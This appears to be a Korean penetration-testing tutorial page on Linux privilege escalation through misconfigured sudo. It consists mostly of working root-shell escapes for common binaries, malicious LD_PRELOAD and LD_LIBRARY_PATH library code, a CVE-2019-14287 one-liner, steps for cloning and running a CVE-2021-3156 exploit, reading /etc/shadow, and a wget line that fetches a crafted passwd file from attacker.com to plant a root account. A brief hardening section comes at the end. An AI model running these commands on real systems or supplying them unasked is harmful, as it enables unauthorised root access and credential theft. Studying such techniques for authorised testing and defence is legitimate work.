---
sidebar_position: 3
title: Linux Privilege Escalation - Sudo
---

# Sudo 권한 상승

## 개요

**sudo (Super User DO)**: 특정 사용자에게 다른 사용자(주로 root) 권한으로 명령 실행 허용

**핵심 개념**:
- `/etc/sudoers` 파일에 정의된 권한
- 특정 명령어만 root 권한으로 실행 가능
- 잘못 설정된 sudo 권한 = 권한 상승 가능

---

## Sudo 권한 확인

### 기본 확인

```bash
# 현재 사용자 sudo 권한
sudo -l

# 비밀번호 요구 시 입력
```

### 출력 해석

```bash
# 예시 출력 1:
User low may run the following commands on hostname:
    (ALL) NOPASSWD: /usr/bin/vim
    (root) /usr/bin/python

# 예시 출력 2:
(ALL, !root) /bin/bash
```

**주요 옵션**:
- `(ALL)`: 모든 사용자로 실행 가능
- `(root)`: root 권한으로만 실행 가능
- `NOPASSWD`: 비밀번호 없이 실행 가능
- `(ALL, !root)`: root 제외 모든 사용자 (취약!)

---

## GTFOBins Sudo 악용

**GTFOBins**: https://gtfobins.github.io/

**사용 방법**:
1. `sudo -l`로 권한 확인
2. GTFOBins에서 바이너리 검색
3. "Sudo" 탭 확인
4. 명령어 복사 및 실행

---

## 주요 Sudo 바이너리

### vim/vi

```bash
# sudo -l 출력:
# (ALL) NOPASSWD: /usr/bin/vim

# 권한 상승
sudo vim -c ':!/bin/sh'

# 또는 vim 내에서
sudo vim
:set shell=/bin/sh
:shell

# vi
sudo vi -c ':!/bin/sh'
```

### python/python3

```bash
# sudo -l 출력:
# (ALL) NOPASSWD: /usr/bin/python

# 권한 상승
sudo python -c 'import os; os.system("/bin/sh")'

# Python3
sudo python3 -c 'import os; os.system("/bin/sh")'
```

### find

```bash
# sudo -l 출력:
# (ALL) NOPASSWD: /usr/bin/find

# 권한 상승
sudo find . -exec /bin/sh \; -quit
```

### less/more

```bash
# sudo -l 출력:
# (ALL) NOPASSWD: /usr/bin/less

# 권한 상승
sudo less /etc/passwd

# less 내에서 입력:
!/bin/sh
```

### awk

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

### nmap

```bash
# 구버전 nmap (< 5.21)
sudo nmap --interactive
nmap> !sh
sh-4.1# whoami
root
```

### perl

```bash
sudo perl -e 'exec "/bin/sh";'
```

### ruby

```bash
sudo ruby -e 'exec "/bin/sh"'
```

### php

```bash
sudo php -r "system('/bin/sh');"
```

### man

```bash
sudo man man

# man 페이지 내에서:
!/bin/sh
```

### nano

```bash
sudo nano

# Ctrl+R Ctrl+X 입력 후:
reset; sh 1>&0 2>&0
```

### wget

```bash
# 파일 읽기
sudo wget -O - file:///etc/shadow

# 파일 쓰기 (악성 계정 추가)
echo 'hacker:x:0:0::/root:/bin/bash' > /tmp/passwd
sudo wget http://attacker.com/passwd -O /etc/passwd
```

### cp

```bash
# /etc/passwd 덮어쓰기
sudo cp /tmp/malicious_passwd /etc/passwd
```

### tar

```bash
# 쉘 실행
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

### zip/unzip

```bash
# zip
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'

# unzip
sudo unzip -K shell.zip -d /tmp
```

### git

```bash
sudo git -p help
# pager 내에서:
!/bin/sh
```

---

## 환경 변수 악용

### LD_PRELOAD

```bash
# sudo -l 출력 확인:
# env_keep+=LD_PRELOAD

# 악성 라이브러리 작성 (shell.c)
cat > shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

# 컴파일
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# 실행 (sudo로 실행 가능한 아무 명령어)
sudo LD_PRELOAD=/tmp/shell.so find

# Root 쉘 획득!
```

### LD_LIBRARY_PATH

```bash
# sudo -l 출력 확인:
# env_keep+=LD_LIBRARY_PATH

# 1. 대상 바이너리의 라이브러리 확인
ldd /usr/bin/apache2

# 2. 악성 라이브러리 생성 (위와 동일한 C 코드)
cat > library.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

# 3. 컴파일 (원본 라이브러리 이름으로)
gcc -fPIC -shared -o library.so.6 library.c

# 4. 실행
sudo LD_LIBRARY_PATH=/tmp apache2
```

---

## CVE Exploits

### CVE-2021-3156 (Sudo Baron Samedit)

**취약 버전**: Sudo 1.8.2-1.8.31p2, 1.9.0-1.9.5p1

```bash
# 1. 버전 확인
sudo -V | head -1
# Sudo version 1.8.31

# 2. Exploit 다운로드
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156

# 3. 컴파일
make

# 4. 실행
./sudo-hax-me-a-sandwich

# 5. Root 쉘 획득!
```

### CVE-2019-14287

**취약 버전**: Sudo < 1.8.28

```bash
# sudo -l 출력:
# (ALL, !root) /bin/bash

# 악용 (User ID -1 = 0 = root)
sudo -u#-1 /bin/bash

# 설명:
# -1은 부호 있는 정수로 최댓값 (4294967295)
# 이것이 UID 0 (root)으로 해석됨
```

---

## Sudo 명령 Wildcards

### tar Wildcard

```bash
# sudo -l 출력:
# (ALL) NOPASSWD: /bin/tar *

# 권한 상승
echo '/bin/sh' > /tmp/shell.sh
chmod +x /tmp/shell.sh
sudo tar -cf /dev/null /dev/null \
  --checkpoint=1 \
  --checkpoint-action=exec=/tmp/shell.sh
```

### rsync Wildcard

```bash
# sudo -l 출력:
# (ALL) NOPASSWD: /usr/bin/rsync *

# 권한 상승
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
```

---

## 실습 예시

### 예시 1: vim을 이용한 권한 상승

```bash
# 1. Sudo 권한 확인
sudo -l
# User low may run the following commands on hostname:
#     (ALL) NOPASSWD: /usr/bin/vim

# 2. GTFOBins에서 vim 검색
# https://gtfobins.github.io/gtfobins/vim/

# 3. 권한 상승
sudo vim -c ':!/bin/sh'

# 4. 확인
id
# uid=0(root) gid=0(root) groups=0(root)

whoami
# root
```

### 예시 2: find를 이용한 권한 상승

```bash
# 1. Sudo 권한 확인
sudo -l
# (ALL) NOPASSWD: /usr/bin/find

# 2. 권한 상승
sudo find . -exec /bin/sh \; -quit

# 3. 확인
whoami
# root
```

### 예시 3: LD_PRELOAD 악용

```bash
# 1. Sudo 권한 확인
sudo -l
# env_keep+=LD_PRELOAD
# (ALL) NOPASSWD: /usr/bin/find

# 2. 악성 라이브러리 생성
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

# 3. 컴파일
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles

# 4. 실행
sudo LD_PRELOAD=/tmp/shell.so find

# 5. Root 쉘 획득!
```

---

## Sudoers 파일 분석

### 파일 위치

```bash
# Sudoers 파일
/etc/sudoers

# Sudoers 디렉토리
/etc/sudoers.d/
```

### 파일 내용 예시

```bash
# /etc/sudoers
root    ALL=(ALL:ALL) ALL
%sudo   ALL=(ALL:ALL) ALL
user    ALL=(ALL) NOPASSWD: /usr/bin/vim
low     (ALL, !root) /bin/bash
```

**해석**:
- `root ALL=(ALL:ALL) ALL`: root는 모든 명령 실행 가능
- `%sudo ALL=(ALL:ALL) ALL`: sudo 그룹 멤버는 모든 명령 실행 가능
- `user ALL=(ALL) NOPASSWD: /usr/bin/vim`: user는 비밀번호 없이 vim 실행 가능
- `low (ALL, !root) /bin/bash`: low는 root 제외 모든 사용자로 bash 실행 가능 (CVE-2019-14287 취약)

---

## 방어 방법

### 최소 권한 원칙

```bash
# Sudoers 파일 편집
visudo

# ❌ 나쁜 예
user ALL=(ALL) NOPASSWD: ALL

# ✅ 좋은 예 (특정 명령어만 허용)
user ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart apache2

# ❌ Wildcard 사용 금지
user ALL=(ALL) NOPASSWD: /bin/tar *

# ✅ 절대 경로만 허용
user ALL=(ALL) NOPASSWD: /bin/tar
```

### 환경 변수 제한

```bash
# Sudoers 파일에서
Defaults    env_reset
Defaults    env_keep -= "LD_PRELOAD"
Defaults    env_keep -= "LD_LIBRARY_PATH"
```

### 정기 감사

```bash
# Sudo 로그 확인
cat /var/log/auth.log | grep sudo

# Sudoers 파일 검증
visudo -c
```

---

## 주요 명령어 요약

```bash
# Sudo 권한 확인
sudo -l

# GTFOBins 확인
# https://gtfobins.github.io/

# 권한 상승 (일반적인 방법)

# vim
sudo vim -c ':!/bin/sh'

# python
sudo python -c 'import os; os.system("/bin/sh")'

# find
sudo find . -exec /bin/sh \; -quit

# less
sudo less /etc/passwd
!/bin/sh

# awk
sudo awk 'BEGIN {system("/bin/sh")}'

# perl
sudo perl -e 'exec "/bin/sh";'

# CVE-2019-14287 악용
sudo -u#-1 /bin/bash

# CVE-2021-3156 확인
sudo -V | head -1

# 권한 확인
id
whoami
```

## 실무 팁

1. ✅ **sudo -l 최우선** - 가장 빠른 권한 상승 경로
2. ✅ **GTFOBins 활용** - 대부분의 바이너리 포함
3. ✅ **환경 변수 확인** - LD_PRELOAD, LD_LIBRARY_PATH
4. ✅ **CVE 확인** - sudo 버전 취약점
5. ✅ **Wildcard 주의** - 특수 문자 포함된 sudo 권한

## 다음 단계

- **SUID 파일 확인** → [Linux Privilege Escalation - SUID](/penetration/post-exploitation/linux-privesc-suid)
- **정보 수집** → [Linux Information Gathering](/penetration/post-exploitation/linux-info-gathering)
